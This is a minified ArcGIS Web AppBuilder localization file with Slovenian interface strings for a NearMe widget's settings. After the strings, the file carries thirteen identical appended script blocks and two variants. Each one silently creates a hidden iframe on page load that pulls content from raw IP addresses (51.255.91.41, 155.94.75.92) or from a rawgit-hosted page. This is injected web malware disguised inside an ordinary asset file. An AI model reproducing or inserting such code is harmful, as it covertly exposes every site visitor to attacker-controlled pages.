// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/NearMe/setting/nls/strings":{units:{miles:{displayText:"Milje",acronym:"mi"},kilometers:{displayText:"Kilometri",acronym:"km"},feet:{displayText:"\u010cevlji",acronym:"ft"},meters:{displayText:"Metri",acronym:"m"}},searchSourceSetting:{searchSourceSettingTabTitle:"Nastavitve vira iskanja",searchSourceSettingTitle:"Nastavitve vira iskanja",searchSourceSettingTitleHintText:"Dodaj in konfiguriraj geokodirne storitve ali geoobjektne sloje kot vire iskanja. Ti viri dolo\u010dajo, kaj je mogo\u010de iskati znotraj iskalnega polja",
addSearchSourceLabel:"Dodajte vir iskanja",featureLayerLabel:"Geoobjektni sloj",geocoderLabel:"Geokodirnik",nameTitle:"Ime",generalSettingLabel:"Splo\u0161na nastavitev",allPlaceholderLabel:"Besedilo ozna\u010dbe mesta za iskanje vsega:",allPlaceholderHintText:"Namig: Vnesite besedilo, ki bo prikazano kot ozna\u010dba mesta med iskanjem po vseh slojih in geokodirniku",generalSettingCheckboxLabel:"Poka\u017ei pojavno okno za najdeni geoobjekt ali lokacijo",countryCode:"\u0160ifre dr\u017eave ali regije",
countryCodeEg:"npr. ",countryCodeHint:"\u010ce to vrednost pustite prazno, bo iskanje potekalo po vseh dr\u017eavah in regijah",questionMark:"?",searchInCurrentMapExtent:"I\u0161\u010di samo v trenutnem obsegu karte",zoomScale:"Pribli\u017eaj merilo",locatorUrl:"URL geokodirnika",locatorName:"Ime geokodirnika",locatorExample:"Primer",locatorWarning:"Ta razli\u010dica geokodirnih storitev ni podprta. Pripomo\u010dek podpira razli\u010dico geokodirne storitve 10.0 in novej\u0161o.",locatorTips:"Predlogi niso na voljo, ker geokodirna storitev ne podpira predlagane zmo\u017enosti.",
layerSource:"Vir sloja",setLayerSource:"Nastavi vir sloja",setGeocoderURL:"Nastavi URL geokodirnika",searchLayerTips:"Predlogi niso na voljo, ker geoobjektna storitev ne podpira mo\u017enosti \u0161tevil\u010denja strani.",placeholder:"Besedilo ozna\u010dbe mesta",searchFields:"Iskalna polja",displayField:"Prika\u017ei polje",exactMatch:"Natan\u010dno ujemanje",maxSuggestions:"Najve\u010d predlogov",maxResults:"Najve\u010d rezultatov",enableLocalSearch:"Omogo\u010di lokalno iskanje",minScale:"Najmanj\u0161e merilo",
minScaleHint:"Ko je merilo karte ve\u010dje od tega merila, bo uporabljeno lokalno iskanje",radius:"Polmer",radiusHint:"Dolo\u010da polmer obmo\u010dja okrog trenutnega sredi\u0161\u010da karte, ki je uporabljeno za pove\u010danje \u0161tevila kandidatov za geokodiranje. Tako so najprej prikazani kandidati, ki so najbli\u017eje lokaciji",meters:"Metri",setSearchFields:"Nastavi iskalna polja",set:"Nastavi",fieldName:"Ime",invalidUrlTip:"URL ${URL} ni veljaven ali dostopen."},searchSetting:{searchSettingTabTitle:"Nastavitve iskanja",
defaultBufferDistanceLabel:"Nastavi privzeto razdaljo obrisa",maxResultCountLabel:"Omejitev \u0161tevila rezultatov",maxResultCountHintLabel:"Namig: Nastavite najve\u010dje \u0161tevilo vidnih rezultatov. Vrednost 1 bo vrnila najbli\u017eji geoobjekt",maxBufferDistanceLabel:"Nastavi najve\u010djo razdaljo obrisa",bufferDistanceUnitLabel:"Enote razdalje obrisa",defaultBufferHintLabel:"Namig: Nastavite privzeto vrednost drsnika obrisa",maxBufferHintLabel:"Namig: Nastavite najve\u010djo vrednost drsnika obrisa",
bufferUnitLabel:"Namig: Dolo\u010dite enoto za ustvarjanje obrisa",selectGraphicLocationSymbol:"Simbol naslova ali lokacije",graphicLocationSymbolHintText:"Namig: Simbol za iskane naslove ali lokacije klika",addressLocationPolygonHintText:"Namig: Simbol za iskane poligonske sloje",popupTitleForPolygon:"Izberite poligon za izbrano lokacijo naslova",popupTitleForPolyline:"Izberite linijo za lokacijo naslova",addressLocationPolylineHintText:"Namig: Simbol za iskani polilinijski sloj",fontColorLabel:"Izberite barvo pisave za iskalne rezultate",
fontColorHintText:"Namig: Barva pisave iskalnih rezultatov",zoomToSelectedFeature:"Pribli\u017eaj izbranemu geoobjektu",zoomToSelectedFeatureHintText:"Namig: Pribli\u017eaj izbranemu geoobjektu namesto obrisu",intersectSearchLocation:"Prika\u017ei poligone, ki se sekajo",intersectSearchLocationHintText:"Namig: Prika\u017ee poligone na iskanih lokacijah namesto poligonov znotraj obrisa",enableProximitySearch:"Omogo\u010di iskanje bli\u017eine",enableProximitySearchHintText:"Namig: Omogo\u010dite zmo\u017enost iskanja lokacij v bli\u017eini izbranega rezultata",
bufferVisibilityLabel:"Nastavi vidnost obrisa",bufferVisibilityHintText:"Namig: Obris bo prikazan na karti",bufferColorLabel:"Nastavite simbol obrisa",bufferColorHintText:"Namig: Izberite barvo in prosojnost obrisa",searchLayerResultLabel:"Nari\u0161i samo izbrane rezultate slojev",searchLayerResultHint:"Namig: Na karti se bodo izrisali samo izbrani sloji iz iskalnih rezultatov",showToolToSelectLabel:"Nastavite gumb lokacije",showToolToSelectHintText:"Namig: Ponudi gumb za nastavitev lokacije na karti v izogib vsakokratnem klikanju in nastavljanju lokacije na karti",
geoDesicParamLabel:"Uporabi geodetski obris",geoDesicParamHintText:"Namig: Uporabi geodetski obris namesto evklidskega obrisa (planarni)"},layerSelector:{selectLayerLabel:"Izberi iskane sloje",layerSelectionHint:"Namig: Uporabi gumb Nastavi za izbiro slojev",addLayerButton:"Nastavi"},routeSetting:{routeSettingTabTitle:"Nastavitve navodil za pot",routeServiceUrl:"Storitev usmerjanja",buttonSet:"Nastavi",routeServiceUrlHintText:"Namig: Kliknite \u00bbNastavi\u00ab za brskanje in izberite storitev usmerjanja",
directionLengthUnit:"Enote dol\u017eine v navodilih za pot",unitsForRouteHintText:"Namig: Uporablja se za prikaz enot za pot",selectRouteSymbol:"Izberite simbol za prikaz poti",routeSymbolHintText:"Namig: Uporablja se za prikaz simbola linije poti",routingDisabledMsg:"Da omogo\u010dite navodila za pot, se v nastavitvah aplikacije prepri\u010dajte, da je usmerjanje omogo\u010deno."},symbologySetting:{symbologySettingTabTitle:"Nastavitve simbologije",addSymbologyBtnLabel:"Dodaj nove simbole",layerNameTitle:"Ime sloja",
fieldTitle:"Polje",valuesTitle:"Vrednosti",symbolTitle:"Simbol",actionsTitle:"Dejanja",invalidConfigMsg:"Podvoji polje : ${fieldName} za sloj : ${layerName}"},filterSetting:{filterSettingTabTitle:"Nastavitve filtra",addTaskTip:"Izbranim iskalnim slojem dodajte enega ali ve\u010d filtrov in za vsakega konfigurirajte parametre.",enableMapFilter:"Odstranite prednastavljeni filter sloja s karte.",newFilter:"Nov filter",filterExpression:"Izraz fitra",layerDefaultSymbolTip:"Uporabi privzeti simbol sloja",
uploadImage:"Nalo\u017ei sliko",selectLayerTip:"Izberite sloj.",setTitleTip:"Nastavite naslov.",noTasksTip:"Filtri niso konfigurirani. Kliknite \u00bb${newFilter}\u00ab za dodajanje novega.",collapseFiltersTip:"Strni izraze filtra (\u010de obstajajo), ko je pripomo\u010dek odprt"},networkServiceChooser:{arcgislabel:"Dodaj iz ArcGIS Online",serviceURLabel:"Dodaj URL storitve",routeURL:"URL poti",validateRouteURL:"Potrdi",exampleText:"Primer",hintRouteURL1:"https://route.arcgis.com/arcgis/rest/services/World/Route/NAServer/",
hintRouteURL2:"https://route.arcgis.com/arcgis/rest/services/World/Route/NAServer/Route_World",invalidRouteServiceURL:"Dolo\u010dite veljavno storitev usmerjanja.",rateLimitExceeded:"Zgornja meja omejitve prese\u017eena. Poskusite znova pozneje.",errorInvokingService:"Uporabni\u0161ko ime ali geslo ni pravilno."},errorStrings:{bufferErrorString:"Vnesite veljavno \u0161tevilsko vrednost.",selectLayerErrorString:"Izberite sloje za iskanje.",invalidDefaultValue:"Privzeta razdalja obrisa ne sme biti prazna. Navedite razdaljo obrisa.",
invalidMaximumValue:"Najve\u010dja razdalja obrisa ne sme biti prazna. Navedite razdaljo obrisa.",defaultValueLessThanMax:"Navedite privzeto razdaljo obrisa znotraj najve\u010dje omejitve",defaultBufferValueGreaterThanOne:"Privzeta razdalja obrisa ne sme biti manj kot 0",maximumBufferValueGreaterThanOne:"Navedite najve\u010djo razdaljo obrisa, ve\u010djo od 0",invalidMaximumResultCountValue:"Navedite veljavno vrednost za najve\u010dje \u0161tevilo rezultatov",invalidSearchSources:"Neveljavne nastavitve iskanja vira"},
symbolPickerPreviewText:"Predogled:",_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});